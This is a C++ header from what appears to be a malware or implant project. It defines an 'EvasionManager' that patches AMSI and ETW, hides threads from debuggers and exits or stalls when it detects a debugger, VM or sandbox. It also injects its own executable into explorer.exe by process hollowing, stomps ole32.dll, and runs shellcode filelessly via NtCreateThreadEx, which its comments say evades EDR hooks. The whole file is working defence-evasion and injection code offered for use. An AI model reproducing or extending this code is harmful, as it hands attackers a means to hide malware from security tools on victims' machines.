#pragma once

#ifdef _WIN32
#include <Windows.h>
#include <string>
#include <vector>
#include <cstdint>
#include <thread>
#include <chrono>

#include "domain/common/AntiAnalysis.hpp"
#include "domain/common/AntiSandbox.hpp"
#include "domain/common/EtwPatch.hpp"
#include "domain/common/AmsiBypass.hpp"
#include "domain/common/ProcessHollowing.hpp"
#include "domain/common/ModuleStomping.hpp"
#include "domain/common/FilelessExec.hpp"
#include "domain/common/EncryptedC2.hpp"

namespace nuub::domain {

class EvasionManager {
    bool stealth_mode_ = false;
    bool anti_debug_enabled_ = true;
    bool anti_vm_enabled_ = false;
    bool etw_patch_enabled_ = true;
    bool amsi_bypass_enabled_ = true;
    bool process_hollowing_enabled_ = false;
    bool module_stomping_enabled_ = false;
    bool direct_syscall_enabled_ = false;
    bool anti_sandbox_enabled_ = true;
    bool environment_keying_enabled_ = true;
    bool anti_forensic_enabled_ = false;

public:
    struct Config {
        bool stealth_mode = false;
        bool anti_debug = true;
        bool anti_vm = false;
        bool etw_patch = true;
        bool amsi_bypass = true;
        bool process_hollowing = false;
        bool module_stomping = false;
        bool direct_syscall = false;
        bool anti_sandbox = true;
        bool environment_keying = true;
        bool anti_forensic = false;
        std::string target_process = "explorer.exe";
    };

    static EvasionManager& instance() {
        static EvasionManager inst;
        return inst;
    }

    void configure(const Config& cfg) {
        stealth_mode_ = cfg.stealth_mode;
        anti_debug_enabled_ = cfg.anti_debug;
        anti_vm_enabled_ = cfg.anti_vm;
        etw_patch_enabled_ = cfg.etw_patch;
        amsi_bypass_enabled_ = cfg.amsi_bypass;
        process_hollowing_enabled_ = cfg.process_hollowing;
        module_stomping_enabled_ = cfg.module_stomping;
        direct_syscall_enabled_ = cfg.direct_syscall;
        anti_sandbox_enabled_ = cfg.anti_sandbox;
        environment_keying_enabled_ = cfg.environment_keying;
        anti_forensic_enabled_ = cfg.anti_forensic;
    }

    // Initialize all evasion techniques
    void initialize() {
        // 1. AMSI bypass (first, before any PowerShell/script execution)
        if (amsi_bypass_enabled_) {
            AmsiBypass::patch();
            AmsiBypass::patch_open_session();
        }

        // 2. Patch ETW (second, before any telemetry can fire)
        if (etw_patch_enabled_) {
            EtwPatch::patch_all();
        }

        // 3. Anti-debug checks
        if (anti_debug_enabled_) {
            // Hide anti-debug thread from debuggers
            hide_thread_from_debugger();

            if (anti::AntiDebug::should_terminate()) {
                if (stealth_mode_) {
                    while (true) {
                        Sleep(10000);
                    }
                }
                ExitProcess(0);
            }
        }

        // 4. Anti-VM checks
        if (anti_vm_enabled_) {
            if (anti::AntiVM::is_virtual_machine()) {
                if (stealth_mode_) {
                    while (true) {
                        Sleep(10000);
                    }
                }
                ExitProcess(0);
            }
        }

        // 5. Anti-sandbox checks
        if (anti_sandbox_enabled_) {
            if (anti::AntiSandbox::is_sandbox()) {
                if (stealth_mode_) {
                    while (true) {
                        Sleep(10000);
                    }
                }
                ExitProcess(0);
            }
        }

        // 6. Environment keying (check if real user machine)
        if (environment_keying_enabled_) {
            if (anti::EnvironmentKeying::is_suspicious_environment()) {
                if (stealth_mode_) {
                    while (true) {
                        Sleep(10000);
                    }
                }
                ExitProcess(0);
            }
        }

        // 5. Start anti-debug monitoring thread
        if (anti_debug_enabled_) {
            std::thread([]() {
                while (true) {
                    Sleep(5000);
                    if (anti::AntiDebug::should_terminate()) {
                        ExitProcess(0);
                    }
                }
            }).detach();
        }

        // 6. Self-inject via process hollowing if configured
        if (process_hollowing_enabled_) {
            execute_stealth(L"explorer.exe");
        }

        // 7. Module stomping if configured
        if (module_stomping_enabled_) {
            execute_module_stompe();
        }
    }

    // Hide a thread from debuggers using NtSetInformationThread
    static void hide_thread_from_debugger() {
        typedef LONG (NTAPI* NtSetInformationThread_t)(HANDLE, ULONG, PVOID, ULONG);

        auto NtSetInformationThread = reinterpret_cast<NtSetInformationThread_t>(
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationThread"));

        if (NtSetInformationThread) {
            NtSetInformationThread(GetCurrentThread(), 0x11, nullptr, 0);
        }
    }

    // Execute via process hollowing (stealth)
    bool execute_stealth(const std::wstring& target_process) {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        HANDLE hFile = CreateFileW(exe_path, GENERIC_READ, FILE_SHARE_READ,
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        DWORD file_size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> exe_data(file_size);

        DWORD bytes_read = 0;
        ReadFile(hFile, exe_data.data(), file_size, &bytes_read, nullptr);
        CloseHandle(hFile);

        if (bytes_read != file_size) return false;

        return ProcessHollowing::hollow_and_run(target_process, exe_data);
    }

    // Execute via module stomping
    bool execute_module_stompe() {
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        HANDLE hFile = CreateFileW(exe_path, GENERIC_READ, FILE_SHARE_READ,
                                   nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) return false;

        DWORD file_size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> exe_data(file_size);

        DWORD bytes_read = 0;
        ReadFile(hFile, exe_data.data(), file_size, &bytes_read, nullptr);
        CloseHandle(hFile);

        if (bytes_read != file_size) return false;

        return ModuleStomping::stompe_and_run(
            L"ole32.dll", exe_data.data(), exe_data.size());
    }

    // Execute shellcode via fileless method (NtCreateThreadEx instead of CreateThread)
    static bool execute_shellcode_fileless(const void* shellcode, size_t size) {
        typedef LONG (NTAPI* NtAllocateVirtualMemory_t)(
            HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
        typedef LONG (NTAPI* NtWriteVirtualMemory_t)(
            HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
        typedef LONG (NTAPI* NtProtectVirtualMemory_t)(
            HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
        typedef LONG (NTAPI* NtCreateThreadEx_t)(
            PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
            ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

        auto ntdll = GetModuleHandleA("ntdll.dll");
        auto NtAllocateVirtualMemory = reinterpret_cast<NtAllocateVirtualMemory_t>(
            GetProcAddress(ntdll, "NtAllocateVirtualMemory"));
        auto NtWriteVirtualMemory = reinterpret_cast<NtWriteVirtualMemory_t>(
            GetProcAddress(ntdll, "NtWriteVirtualMemory"));
        auto NtProtectVirtualMemory = reinterpret_cast<NtProtectVirtualMemory_t>(
            GetProcAddress(ntdll, "NtProtectVirtualMemory"));
        auto NtCreateThreadEx = reinterpret_cast<NtCreateThreadEx_t>(
            GetProcAddress(ntdll, "NtCreateThreadEx"));

        if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory ||
            !NtProtectVirtualMemory || !NtCreateThreadEx) {
            return false;
        }

        // Allocate RW memory
        PVOID base = nullptr;
        SIZE_T region_size = size;
        NTSTATUS status = NtAllocateVirtualMemory(
            GetCurrentProcess(), &base, 0, &region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status < 0) return false;

        // Write shellcode
        SIZE_T written = 0;
        status = NtWriteVirtualMemory(
            GetCurrentProcess(), base, const_cast<void*>(shellcode), size, &written);
        if (status < 0) {
            VirtualFree(base, 0, MEM_RELEASE);
            return false;
        }

        // Change to RX (never RWX)
        DWORD old_protect = 0;
        SIZE_T protect_size = size;
        status = NtProtectVirtualMemory(
            GetCurrentProcess(), &base, &protect_size,
            PAGE_EXECUTE_READ, &old_protect);
        if (status < 0) {
            VirtualFree(base, 0, MEM_RELEASE);
            return false;
        }

        // Create thread via NtCreateThreadEx (bypasses EDR hooks on CreateThread)
        HANDLE thread = nullptr;
        status = NtCreateThreadEx(
            &thread, THREAD_ALL_ACCESS, nullptr,
            GetCurrentProcess(), base, nullptr,
            0, 0, 0, 0, nullptr);

        if (status < 0 || !thread) {
            VirtualFree(base, 0, MEM_RELEASE);
            return false;
        }

        CloseHandle(thread);
        return true;
    }

    // Getters
    bool is_stealth_mode() const { return stealth_mode_; }
    bool is_anti_debug_enabled() const { return anti_debug_enabled_; }
    bool is_etw_patched() const { return etw_patch_enabled_; }
    bool is_amsi_patched() const { return amsi_bypass_enabled_; }
    bool is_process_hollowing_enabled() const { return process_hollowing_enabled_; }
    bool is_module_stomping_enabled() const { return module_stomping_enabled_; }
    bool is_direct_syscall_enabled() const { return direct_syscall_enabled_; }
    bool is_anti_sandbox_enabled() const { return anti_sandbox_enabled_; }
    bool is_environment_keying_enabled() const { return environment_keying_enabled_; }
    bool is_anti_forensic_enabled() const { return anti_forensic_enabled_; }
};

} // namespace nuub::domain
#endif
